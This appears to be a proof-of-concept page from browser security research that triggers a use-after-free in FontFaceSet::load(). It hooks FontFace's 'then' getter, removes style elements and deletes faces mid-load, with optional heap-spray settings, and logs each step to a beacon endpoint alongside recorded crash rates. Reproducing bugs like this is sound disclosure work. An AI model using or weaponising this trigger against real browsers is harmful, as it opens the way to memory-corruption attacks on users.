// Finding 12, issue #143: FontFaceSet::load() use-after-free on 14.10.
//
// Serve this file as the default page. It is the issue's v9 trigger, unchanged,
// with every step posted synchronously to /beacon/<tag> so the last beacon in the
// server log names the last step that ran. A config file at
// /corpus/ffset-config.json may set {"spray":N,"del":0|1,"rm":0|1,"layout":0|1,
// "reload":0|1}; without it the page runs the crashing shape once.
//
// Observed on 14.10 (46 attempts, one WebProcess):
//   remove + fonts.delete      5 attempts, 4 deaths, all at GETTER returning
//   remove, no fonts.delete    2 attempts, 1 death
//   no removal, fonts.delete  19 attempts, 0 deaths
//   remove + 1000-rule spray  20 attempts, 0 deaths (11 resolved, 9 pending)

document.write('<textarea id="log" readonly style="width:100%;height:300px"></textarea>');

(function () {
  var logEl = document.getElementById('log');
  var cfg = { spray: 0, jsfaces: 0, jsfaces_rm: 0, jsfaces_ig: 0, cssrules: 0, del: 1, rm: 1, layout: 1, reload: 0, rmtarget: 'victim' };
  try {
    var xc = new XMLHttpRequest();
    xc.open('GET', '/corpus/ffset-config.json', false);
    xc.send();
    var c = JSON.parse(xc.responseText);
    for (var k in cfg) if (c[k] !== undefined) cfg[k] = (k === 'spray' || k === 'jsfaces' || k === 'jsfaces_rm' || k === 'jsfaces_ig' || k === 'cssrules') ? (c[k] | 0) : (k === 'rmtarget') ? String(c[k]) : (c[k] ? 1 : 0);
  } catch (e) {}

  function syncLog(tag, msg) {
    var line = 'FFSET spray=' + cfg.spray + ' js=' + cfg.jsfaces + ' jsrm=' + cfg.jsfaces_rm + ' jsig=' + cfg.jsfaces_ig +
               ' css=' + cfg.cssrules + ' del=' + cfg.del +
               ' rm=' + cfg.rm + ' lay=' + cfg.layout + ' tgt=' + cfg.rmtarget + ' ' + tag + ' ' + msg;
    logEl.value += line + '\n';
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag, false);
      x.send(line);
    } catch (e) {}
  }

  var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A);
  void A.loaded;
  syncLog('ADD', 'FontFace a added');

  var fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function () {
      if (fired) return undefined;
      fired = true;
      syncLog('GETTER', 'enter');
      if (cfg.rm) {
        try {
          var st = document.getElementById(cfg.rmtarget === 'other' ? 'other-style'
                     : cfg.rmtarget === 'plain' ? 'plain-style' : 'victim-style');
          if (st) { st.remove(); syncLog('GETTER', 'style-removed'); }
        } catch (e) { syncLog('GETTER', 'style-err ' + e); }
      }
      if (cfg.jsfaces_rm > 0) {
        var madeRm = makeFaces(cfg.jsfaces_rm, 'r');
        syncLog('JFACES-RM', 'created=' + madeRm + ' after-remove before-layout');
      }
      if (cfg.layout) {
        try { void document.body.offsetHeight; syncLog('GETTER', 'layout'); } catch (e) {}
      }
      if (cfg.jsfaces_ig > 0) {
        var madeIg = makeFaces(cfg.jsfaces_ig, 'g');
        syncLog('JFACES-IG', 'created=' + madeIg + ' after-layout');
      }
      if (cfg.del) {
        try { document.fonts.delete(this); syncLog('GETTER', 'delete'); } catch (e) {}
      }
      syncLog('GETTER', 'returning');
      return undefined;
    },
    set: function () {}
  });
  syncLog('HOOK', 'then hooked');

  var st2 = document.createElement('style');
  st2.id = 'victim-style';
  st2.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
  document.head.appendChild(st2);
  var st3 = document.createElement('style');
  st3.id = 'other-style';
  st3.textContent = '@font-face { font-family: z; src: local(Arial); unicode-range: U+0042; }';
  document.head.appendChild(st3);
  var st4 = document.createElement('style');
  st4.id = 'plain-style';
  st4.textContent = 'p { color: rgb(1, 2, 3); }';
  document.head.appendChild(st4);
  syncLog('VICTIM', 'style injected (victim=x, other=z, plain=css)');

  var watch = [];
  function makeFaces(n, tagName) {
    var made = 0;
    for (var j = 0; j < n; j++) {
      try {
        var f = new FontFace(tagName + j, 'local(Arial)', { unicodeRange: 'U+0043' });
        document.fonts.add(f);
        watch.push({ face: f, st: String(f.status), settled: '' });
        f.loaded.then(
          (function (k) { return function () { watch[k].settled = 'loaded:' + String(watch[k].face.status); }; })(watch.length - 1),
          (function (k) { return function () { watch[k].settled = 'error:' + String(watch[k].face.status); }; })(watch.length - 1)
        );
        made++;
      } catch (e) { syncLog('JFACE-ERR', String(e)); break; }
    }
    return made;
  }

  if (cfg.jsfaces > 0) {
    var made = makeFaces(cfg.jsfaces, 'j');
    void document.body.offsetHeight;
    syncLog('JFACES', 'created=' + made);
  }

  function reportFaces(when) {
    if (!watch.length) return;
    var moved = [], settled = [];
    for (var i = 0; i < watch.length; i++) {
      if (String(watch[i].face.status) !== watch[i].st) moved.push(i + ':' + watch[i].st + '>' + watch[i].face.status);
      if (watch[i].settled) settled.push(i + ':' + watch[i].settled);
    }
    syncLog('FACES', when + ' moved=' + moved.length + (moved.length ? ' [' + moved.slice(0, 4).join(',') + ']' : '') +
            ' settled=' + settled.length + (settled.length ? ' [' + settled.slice(0, 4).join(',') + ']' : ''));
  }

  if (cfg.cssrules > 0) {
    var plain = [];
    for (var q = 0; q < cfg.cssrules; q++) plain.push('p.c' + q + ' { color: rgb(1, 2, 3); }');
    var spc = document.createElement('style');
    spc.textContent = plain.join('\n');
    document.head.appendChild(spc);
    void document.body.offsetHeight;
    syncLog('CSSRULES', 'rules=' + cfg.cssrules);
  }

  if (cfg.spray > 0) {
    var rules = [];
    for (var i = 0; i < cfg.spray; i++) {
      rules.push('@font-face { font-family: s' + i + '; src: local(Arial); unicode-range: U+0043; }');
    }
    var sp = document.createElement('style');
    sp.textContent = rules.join('\n');
    document.head.appendChild(sp);
    void document.body.offsetHeight;
    syncLog('SPRAY', 'rules=' + cfg.spray);
  }

  syncLog('CALL', 'document.fonts.load');
  document.fonts.load('1em a, x', 'AB').then(
    function (list) {
      var fams = [];
      try {
        for (var i = 0; i < list.length; i++) {
          var f = list[i];
          fams.push(String(f && f.family !== undefined ? f.family : f));
        }
      } catch (e) { fams.push('err:' + e); }
      syncLog('RESOLVED', 'no crash n=' + (list ? list.length : -1) + ' fams=[' + fams.join(',') + ']');
    },
    function (e) { syncLog('REJECTED', String(e)); }
  );
  syncLog('PROMISE', 'load returned');

  reportFaces('sync');
  var ticks = 0;
  var tick = setInterval(function () {
    ticks++;
    reportFaces('t' + (ticks * 200));
    if (ticks >= 5) clearInterval(tick);
  }, 200);

  setTimeout(function () {
    syncLog('ALIVE', '1500ms');
    if (cfg.reload) setTimeout(function () { try { location.reload(); } catch (e) {} }, 700);
  }, 1500);
})();
